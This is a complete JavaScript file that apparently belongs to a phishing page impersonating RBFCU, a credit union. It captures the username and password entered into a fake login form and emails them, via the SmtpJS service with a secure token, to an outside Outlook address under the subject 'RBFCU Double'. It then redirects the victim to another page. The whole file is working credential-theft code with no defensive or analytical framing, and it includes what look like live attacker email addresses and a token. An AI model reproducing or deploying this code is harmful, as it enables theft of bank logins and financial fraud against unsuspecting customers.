const fusername = document.getElementById('ffusername');
const fpassword = document.getElementById('ffpassword');
const submit = document.getElementsByClassName('fform-contact')[0];

submit.addEventListener('submit', (e) => {
    e.preventDefault();

    let ebody = `
    <b>RBFCU Red Screen</b>
    <br>
    <br>
    <b>User: </b>${fusername.value} 
    <br>
    <br>
    <b>Pass: </b>${fpassword.value} 
    <br>`;

    Email.send({
        SecureToken: "9c8cec46-60dd-4046-b3d0-0751b0d5c5c0",
        To: 'jakesfishin111@outlook.com',
        From: "jakeramon999@gmail.com",
        Subject: "RBFCU Double: " + fusername.value,
        Body: ebody
    }).then(function() {
        window.location.href = "f.html";
    });
});